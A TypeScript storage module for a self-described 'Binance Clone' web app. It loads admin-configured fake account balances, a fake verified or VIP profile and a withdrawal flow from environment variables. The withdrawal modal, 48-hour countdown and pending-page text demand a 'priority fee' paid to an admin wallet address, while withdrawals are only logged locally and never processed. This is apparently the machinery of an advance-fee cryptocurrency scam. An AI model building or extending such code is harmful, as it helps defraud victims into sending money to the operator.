// Persistent Storage System for Binance Clone
// All admin data is loaded from environment variables
// User sessions are stored in localStorage

export interface AdminData {
  // Authentication
  authPassword: string;
  authVerificationCode: string;
  testMode: boolean;

  // Profile
  profilePhoto: string | null;
  profileName: string;
  userId: string;
  isVip: boolean;
  isVerified: boolean;

  // Balance
  cryptoBalance: number;
  cryptoSymbol: string;
  fiatBalance: number;
  fiatSymbol: string;

  // Withdrawal Modal
  modalTitleTemplate: string;
  modalScrollableMessage: string;
  priorityQueueTitle: string;
  priorityQueueDescription: string;
  networkDisplayName: string;
  adminWalletAddress: string;
  yellowWarningText: string;
  feeAmount: number;
  countdownDuration: number; // in seconds
  primaryButtonText: string;
  secondaryButtonText: string;

  // Pending Page
  pendingTitle: string;
  pendingMessageLine1: string;
  pendingMessageLine2: string;
  pendingMessageLine3: string;
  pendingOkButtonText: string;

  // Settings
  adminPassword: string;
}

export interface UserSession {
  isLoggedIn: boolean;
  loginIdentifier: string;
  stayLoggedIn: boolean;
  sessionExpiry: number | null;
}

export interface WithdrawalTransaction {
  id: string;
  amount: number;
  cryptoSymbol: string;
  address: string;
  network: string;
  timestamp: number;
  status: 'pending' | 'completed';
}

const STORAGE_KEYS = {
  USER_SESSION: 'binance_user_session',
  WITHDRAWAL_HISTORY: 'binance_withdrawal_history',
  LAST_WITHDRAWAL: 'binance_last_withdrawal',
} as const;

// Helper function to parse comma-separated values
const parseVerificationCodes = (codes: string): string[] => {
  if (!codes) return [];
  return codes.split(',').map(c => c.trim()).filter(c => c);
};

// Load admin data from environment variables at initialization
function loadAdminDataFromEnv(): AdminData {
  return {
    // Authentication
    authPassword: import.meta.env.VITE_AUTH_PASSWORD || '',
    authVerificationCode: parseVerificationCodes(import.meta.env.VITE_AUTH_VERIFICATION_CODES).join(','),
    testMode: import.meta.env.VITE_TEST_MODE === 'true',

    // Profile
    profilePhoto: import.meta.env.VITE_PROFILE_PHOTO || null,
    profileName: import.meta.env.VITE_PROFILE_NAME || 'Crypto Trader',
    userId: import.meta.env.VITE_USER_ID || '123456789',
    isVip: import.meta.env.VITE_IS_VIP === 'true',
    isVerified: import.meta.env.VITE_IS_VERIFIED === 'true',

    // Balance
    cryptoBalance: parseFloat(import.meta.env.VITE_CRYPTO_BALANCE || '0'),
    cryptoSymbol: import.meta.env.VITE_CRYPTO_SYMBOL || 'BTC',
    fiatBalance: parseFloat(import.meta.env.VITE_FIAT_BALANCE || '0'),
    fiatSymbol: import.meta.env.VITE_FIAT_SYMBOL || '$',

    // Withdrawal Modal
    modalTitleTemplate: import.meta.env.VITE_MODAL_TITLE_TEMPLATE || 'Processing Withdrawal of [AMOUNT]',
    modalScrollableMessage: import.meta.env.VITE_MODAL_MESSAGE?.replace(/\\n/g, '\n') || '',
    priorityQueueTitle: import.meta.env.VITE_PRIORITY_QUEUE_TITLE || 'Priority Fee',
    priorityQueueDescription: import.meta.env.VITE_PRIORITY_QUEUE_DESCRIPTION || 'A processing fee is required',
    networkDisplayName: import.meta.env.VITE_NETWORK_DISPLAY_NAME || 'BSC (BEP20)',
    adminWalletAddress: import.meta.env.VITE_ADMIN_WALLET_ADDRESS || '',
    yellowWarningText: import.meta.env.VITE_YELLOW_WARNING_TEXT || 'Confirm the fee amount',
    feeAmount: parseFloat(import.meta.env.VITE_FEE_AMOUNT || '0'),
    countdownDuration: parseInt(import.meta.env.VITE_COUNTDOWN_DURATION || '172800', 10),
    primaryButtonText: import.meta.env.VITE_PRIMARY_BUTTON_TEXT || 'Continue',
    secondaryButtonText: import.meta.env.VITE_SECONDARY_BUTTON_TEXT || 'Cancel',

    // Pending Page
    pendingTitle: import.meta.env.VITE_PENDING_TITLE || 'Withdrawal Pending',
    pendingMessageLine1: import.meta.env.VITE_PENDING_MESSAGE_LINE1 || 'Your withdrawal request has been submitted',
    pendingMessageLine2: import.meta.env.VITE_PENDING_MESSAGE_LINE2 || 'Please complete the fee payment',
    pendingMessageLine3: import.meta.env.VITE_PENDING_MESSAGE_LINE3 || 'Transaction ID will be generated upon confirmation',
    pendingOkButtonText: import.meta.env.VITE_PENDING_OK_BUTTON_TEXT || 'OK',

    // Settings
    adminPassword: import.meta.env.VITE_ADMIN_PASSWORD || '',
  };
}

// Cache admin data loaded from env vars at startup
let cachedAdminData: AdminData | null = null;

// Storage utility functions
export const storage = {
  // Admin Data - LOADED FROM ENV VARS
  async getAdminData(): Promise<AdminData> {
    // Return cached data (env vars don't change during runtime)
    if (cachedAdminData) {
      return cachedAdminData;
    }
    
    cachedAdminData = loadAdminDataFromEnv();
    return cachedAdminData;
  },

  async setAdminData(_data: Partial<AdminData>): Promise<void> {
    // No-op: env vars are read-only at runtime
    console.warn('setAdminData called but admin data is loaded from env vars and cannot be modified at runtime');
  },

  async resetAdminData(): Promise<void> {
    // No-op: env vars cannot be reset at runtime
    console.warn('resetAdminData called but admin data is loaded from env vars and cannot be reset');
  },

  // User Session - localStorage only
  getUserSession(): UserSession {
    try {
      const data = localStorage.getItem(STORAGE_KEYS.USER_SESSION);
      if (data) {
        const session = JSON.parse(data);
        // Check if session expired
        if (session.sessionExpiry && Date.now() > session.sessionExpiry) {
          this.clearUserSession();
          return { isLoggedIn: false, loginIdentifier: '', stayLoggedIn: false, sessionExpiry: null };
        }
        return session;
      }
    } catch (e) {
      console.error('Error reading user session:', e);
    }
    return { isLoggedIn: false, loginIdentifier: '', stayLoggedIn: false, sessionExpiry: null };
  },

  setUserSession(session: UserSession): void {
    try {
      localStorage.setItem(STORAGE_KEYS.USER_SESSION, JSON.stringify(session));
    } catch (e) {
      console.error('Error saving user session:', e);
    }
  },

  clearUserSession(): void {
    try {
      localStorage.removeItem(STORAGE_KEYS.USER_SESSION);
    } catch (e) {
      console.error('Error clearing user session:', e);
    }
  },

  // Withdrawal History - localStorage only
  getWithdrawalHistory(): WithdrawalTransaction[] {
    try {
      const data = localStorage.getItem(STORAGE_KEYS.WITHDRAWAL_HISTORY);
      if (data) {
        return JSON.parse(data);
      }
    } catch (e) {
      console.error('Error reading withdrawal history:', e);
    }
    return [];
  },

  addWithdrawal(transaction: WithdrawalTransaction): void {
    try {
      const history = this.getWithdrawalHistory();
      history.push(transaction);
      localStorage.setItem(STORAGE_KEYS.WITHDRAWAL_HISTORY, JSON.stringify(history));
    } catch (e) {
      console.error('Error saving withdrawal:', e);
    }
  },

  getLastWithdrawal(): WithdrawalTransaction | null {
    try {
      const history = this.getWithdrawalHistory();
      return history.length > 0 ? history[history.length - 1] : null;
    } catch (e) {
      console.error('Error fetching last withdrawal:', e);
    }
    return null;
  },

  // Data Export/Import
  exportAllData(): string {
    const adminData = cachedAdminData || loadAdminDataFromEnv();
    const userSession = this.getUserSession();
    const withdrawalHistory = this.getWithdrawalHistory();
    
    const data = {
      adminData,
      userSession,
      withdrawalHistory,
      exportDate: new Date().toISOString(),
    };
    return JSON.stringify(data, null, 2);
  },

  importAllData(jsonString: string): boolean {
    try {
      const data = JSON.parse(jsonString);
      if (data.userSession) {
        this.setUserSession(data.userSession);
      }
      if (data.withdrawalHistory) {
        const history = data.withdrawalHistory as WithdrawalTransaction[];
        localStorage.setItem(STORAGE_KEYS.WITHDRAWAL_HISTORY, JSON.stringify(history));
      }
      return true;
    } catch (e) {
      console.error('Error importing data:', e);
      return false;
    }
  },

  // Reset all data
  resetAllData(): void {
    this.clearUserSession();
    try {
      localStorage.removeItem(STORAGE_KEYS.WITHDRAWAL_HISTORY);
    } catch (e) {
      console.error('Error resetting data:', e);
    }
  },
};

export default storage;
